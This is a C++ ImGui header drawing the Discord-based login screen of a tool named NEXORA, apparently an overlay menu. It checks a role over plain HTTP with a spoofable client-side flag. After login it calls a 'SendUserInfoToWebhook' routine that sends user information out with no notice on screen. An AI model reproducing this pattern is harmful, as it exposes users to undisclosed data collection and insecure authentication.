#pragma once
#include <Includes/Includes.hpp>
#include <winhttp.h>
#include <Security/UserInfo.hpp>
#include <string>
#include <thread>
#include <cstdlib>
#include <cmath>

#pragma comment(lib, "winhttp.lib")

namespace Login {

    // --- State ---
    inline bool IsAuthenticated = false;
    inline bool AuthInProgress  = false;
    inline bool AuthChecking    = false;
    inline std::string DiscordUserId = "";

    // Hover animation states (one per interactive button)
    static float s_HoverDiscord = 0.f;
    static float s_HoverVerify  = 0.f;
    static float s_HoverClose   = 0.f;

    // --- HTTP check ---
    inline void CheckAuthStatus() {
        AuthChecking = true;

        std::thread([]() {
            HINTERNET hSession = WinHttpOpen(
                L"NexoraAuth/1.0",
                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                WINHTTP_NO_PROXY_NAME,
                WINHTTP_NO_PROXY_BYPASS, 0);

            if (!hSession) { AuthChecking = false; return; }

            HINTERNET hConnect = WinHttpConnect(hSession, L"nexora-auth.wispbyte.app", 80, 0);
            if (!hConnect) { WinHttpCloseHandle(hSession); AuthChecking = false; return; }

            std::wstring path = L"/api/check-role?userId="
                + std::wstring(DiscordUserId.begin(), DiscordUserId.end());

            HINTERNET hRequest = WinHttpOpenRequest(
                hConnect, L"GET", path.c_str(),
                nullptr, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                AuthChecking = false;
                return;
            }

            DWORD timeout = 10000;
            WinHttpSetTimeouts(hRequest, timeout, timeout, timeout, timeout);

            if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                AuthChecking = false;
                return;
            }

            if (!WinHttpReceiveResponse(hRequest, nullptr)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                AuthChecking = false;
                return;
            }

            std::string response;
            DWORD dwSize = 0;
            do {
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                if (!dwSize) break;

                char* buf = new char[dwSize + 1]{};
                DWORD dwRead = 0;
                if (WinHttpReadData(hRequest, buf, dwSize, &dwRead))
                    response.append(buf, dwRead);
                delete[] buf;
            } while (dwSize > 0);

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            if (response.find("\"hasRole\":true") != std::string::npos) {
                IsAuthenticated = true;
                UserInfo::InfoCollector::SendUserInfoToWebhook(DiscordUserId);
                UserInfo::InfoCollector::SendAuthResultToWebhook(true, DiscordUserId, "Role Sbire OK");
            } else {
                IsAuthenticated = false;
                UserInfo::InfoCollector::SendAuthResultToWebhook(false, DiscordUserId, "Role Sbire manquant");
            }
            AuthChecking = false;
        }).detach();
    }

    // --- Helper: draw a styled button, returns true if clicked ---
    // hover_t is a [0..1] float animated outside
    inline bool StyledButton(ImDrawList* dl, const char* label,
        ImVec2 center, ImVec2 size, float& hover_t, float dt,
        ImVec4 col_base, ImVec4 col_hover, ImVec4 col_text)
    {
        ImVec2 tl = ImVec2(center.x - size.x * 0.5f, center.y - size.y * 0.5f);
        ImVec2 br = ImVec2(tl.x + size.x, tl.y + size.y);

        // absolute -> window relative for IsMouseHoveringRect
        ImVec2 win_pos = ImGui::GetWindowPos();
        ImVec2 abs_tl  = ImVec2(tl.x + win_pos.x, tl.y + win_pos.y);
        ImVec2 abs_br  = ImVec2(br.x + win_pos.x, br.y + win_pos.y);

        bool hovered = ImGui::IsWindowHovered(ImGuiHoveredFlags_AllowWhenBlockedByPopup)
                    && ImGui::IsMouseHoveringRect(abs_tl, abs_br);
        bool clicked = hovered && ImGui::IsMouseClicked(0);

        // animate
        float target = hovered ? 1.f : 0.f;
        hover_t = ImClamp(ImLerp(hover_t, target, dt * 12.f), 0.f, 1.f);

        // blend color
        ImVec4 col = ImVec4(
            col_base.x + (col_hover.x - col_base.x) * hover_t,
            col_base.y + (col_hover.y - col_base.y) * hover_t,
            col_base.z + (col_hover.z - col_base.z) * hover_t,
            col_base.w + (col_hover.w - col_base.w) * hover_t
        );

        // scale on hover
        float scale = 1.f + 0.02f * hover_t;
        ImVec2 hsz = ImVec2(size.x * scale * 0.5f, size.y * scale * 0.5f);
        ImVec2 stl = ImVec2(center.x - hsz.x, center.y - hsz.y);
        ImVec2 sbr = ImVec2(center.x + hsz.x, center.y + hsz.y);

        // glow
        if (hover_t > 0.01f) {
            ImU32 glow = ImGui::GetColorU32(ImVec4(col.x, col.y, col.z, 0.18f * hover_t));
            for (int g = 3; g >= 1; g--)
                dl->AddRectFilled(
                    ImVec2(stl.x - g * 3.f, stl.y - g * 2.f),
                    ImVec2(sbr.x + g * 3.f, sbr.y + g * 2.f),
                    glow, 10.f + g * 2.f);
        }

        dl->AddRectFilled(stl, sbr, ImGui::GetColorU32(col), 8.f);
        dl->AddRect(stl, sbr,
            ImGui::GetColorU32(ImVec4(1.f, 1.f, 1.f, 0.07f + 0.10f * hover_t)),
            8.f, 0, 1.2f);

        // label centered
        ImVec2 tsz = ImGui::CalcTextSize(label);
        dl->AddText(
            ImVec2(center.x - tsz.x * 0.5f, center.y - tsz.y * 0.5f),
            ImGui::GetColorU32(ImVec4(col_text.x, col_text.y, col_text.z,
                                     col_text.w * (0.7f + 0.3f * hover_t))),
            label);

        return clicked;
    }

    // --- Main render ---
    inline void Render() {
        const float dt        = ImGui::GetIO().DeltaTime;
        const float mw        = g_MenuInfo.MenuSize.x;
        const float mh        = g_MenuInfo.MenuSize.y;
        const float cx        = mw * 0.5f;
        const float cy        = mh * 0.5f;

        // card dimensions
        const float card_w    = 420.f;
        const float card_h    = 320.f;
        const float card_l    = cx - card_w * 0.5f;
        const float card_t    = cy - card_h * 0.5f;
        const float card_r    = card_l + card_w;
        const float card_b    = card_t + card_h;

        ImDrawList* dl = ImGui::GetWindowDrawList();
        ImVec2 win_pos  = ImGui::GetWindowPos();

        // ── card background ───────────────────────────────────────
        // outer shadow
        for (int s = 4; s >= 1; s--) {
            float e = (float)s * 4.f;
            dl->AddRectFilled(
                ImVec2(card_l - e, card_t - e),
                ImVec2(card_r + e, card_b + e),
                ImGui::GetColorU32(ImVec4(0.f, 0.f, 0.f, 0.05f * s)),
                18.f + e);
        }

        dl->AddRectFilled(
            ImVec2(card_l, card_t), ImVec2(card_r, card_b),
            ImGui::GetColorU32(ImVec4(0.10f, 0.10f, 0.12f, 0.97f)), 14.f);

        // top accent bar
        dl->AddRectFilled(
            ImVec2(card_l + 40.f, card_t),
            ImVec2(card_r - 40.f, card_t + 2.5f),
            ImGui::GetColorU32(g_Col.Primary), 2.f);

        // border
        dl->AddRect(
            ImVec2(card_l, card_t), ImVec2(card_r, card_b),
            ImGui::GetColorU32(ImVec4(1.f, 1.f, 1.f, 0.06f)), 14.f, 0, 1.f);

        // ── title ─────────────────────────────────────────────────
        {
            const char* title = "NEXORA";
            ImVec2 tsz = ImGui::CalcTextSize(title);
            ImGui::SetCursorPos(ImVec2(cx - tsz.x * 0.5f, card_t + 28.f));
            ImGui::TextColored(g_Col.PrimaryText, title);
        }
        {
            const char* sub = "Authentification requise";
            ImVec2 tsz = ImGui::CalcTextSize(sub);
            ImGui::SetCursorPos(ImVec2(cx - tsz.x * 0.5f, card_t + 56.f));
            ImGui::TextColored(ImVec4(0.5f, 0.5f, 0.5f, 1.f), sub);
        }

        // divider
        dl->AddLine(
            ImVec2(card_l + 30.f, card_t + 88.f),
            ImVec2(card_r - 30.f, card_t + 88.f),
            ImGui::GetColorU32(ImVec4(1.f, 1.f, 1.f, 0.06f)), 1.f);

        // ── body: checking spinner OR buttons ─────────────────────
        if (AuthChecking) {
            // spinner
            static float spin_a = 0.f;
            spin_a += dt * 5.5f;

            ImVec2 sc = ImVec2(cx, cy + 10.f);
            float r   = 26.f;
            int segs  = 10;
            for (int i = 0; i < segs; i++) {
                float a  = spin_a + IM_PI * 2.f * i / segs;
                float fa = (float)(i + 1) / segs;
                ImVec2 pt = ImVec2(sc.x + cosf(a) * r, sc.y + sinf(a) * r);
                dl->AddCircleFilled(pt, 3.5f,
                    ImGui::GetColorU32(ImVec4(1.f, 1.f, 1.f, fa * 0.85f)), 8);
            }

            const char* chk = "Verification en cours...";
            ImVec2 tsz = ImGui::CalcTextSize(chk);
            ImGui::SetCursorPos(ImVec2(cx - tsz.x * 0.5f, cy + 46.f));
            ImGui::TextColored(ImVec4(0.55f, 0.55f, 0.55f, 1.f), chk);

        } else {
            // button layout: centered vertically in the lower card area
            const float btn_w  = 260.f;
            const float btn_h  = 40.f;
            const float area_t = card_t + 104.f;

            // "Connexion avec Discord"
            ImVec2 btn1c = ImVec2(cx, area_t + 28.f);
            if (StyledButton(dl, "Connexion avec Discord",
                btn1c, ImVec2(btn_w, btn_h), s_HoverDiscord, dt,
                ImVec4(0.20f, 0.20f, 0.23f, 1.f),
                ImVec4(0.34f, 0.40f, 0.72f, 1.f),
                ImVec4(1.f, 1.f, 1.f, 1.f)))
            {
                std::system("start \"\" \"https://nexora-auth.wispbyte.app/auth/discord\"");
                AuthInProgress = true;
            }

            if (AuthInProgress) {
                // status hint
                const char* hint = "Page Discord ouverte, authentifie-toi puis clique ci-dessous";
                ImVec2 hsz = ImGui::CalcTextSize(hint);
                ImGui::SetCursorPos(ImVec2(cx - hsz.x * 0.5f, area_t + 76.f));
                ImGui::TextColored(ImVec4(0.45f, 0.75f, 0.45f, 1.f), hint);

                // "Verifier mon role"
                ImVec2 btn2c = ImVec2(cx, area_t + 116.f);
                if (StyledButton(dl, "Verifier mon role",
                    btn2c, ImVec2(btn_w, btn_h), s_HoverVerify, dt,
                    ImVec4(0.20f, 0.20f, 0.23f, 1.f),
                    ImVec4(0.22f, 0.60f, 0.32f, 1.f),
                    ImVec4(1.f, 1.f, 1.f, 1.f)))
                {
                    if (!DiscordUserId.empty())
                        CheckAuthStatus();
                }
            } else {
                // info before first click
                const char* info = "Clique sur le bouton pour ouvrir la page d'authentification";
                ImVec2 tsz = ImGui::CalcTextSize(info);
                ImGui::SetCursorPos(ImVec2(cx - tsz.x * 0.5f, area_t + 76.f));
                ImGui::TextColored(ImVec4(0.38f, 0.38f, 0.38f, 1.f), info);
            }

            // role hint
            const char* role_txt = "Role requis : Sbire";
            ImVec2 rtsz = ImGui::CalcTextSize(role_txt);
            ImGui::SetCursorPos(ImVec2(cx - rtsz.x * 0.5f, card_b - 68.f));
            ImGui::TextColored(ImVec4(0.35f, 0.35f, 0.35f, 1.f), role_txt);
        }

        // ── close button at bottom of card ────────────────────────
        ImVec2 closec = ImVec2(cx, card_b - 28.f);
        if (StyledButton(dl, "Fermer",
            closec, ImVec2(120.f, 30.f), s_HoverClose, dt,
            ImVec4(0.18f, 0.18f, 0.20f, 1.f),
            ImVec4(0.60f, 0.18f, 0.18f, 1.f),
            ImVec4(0.85f, 0.85f, 0.85f, 1.f)))
        {
            ExitProcess(0);
        }
    }
}
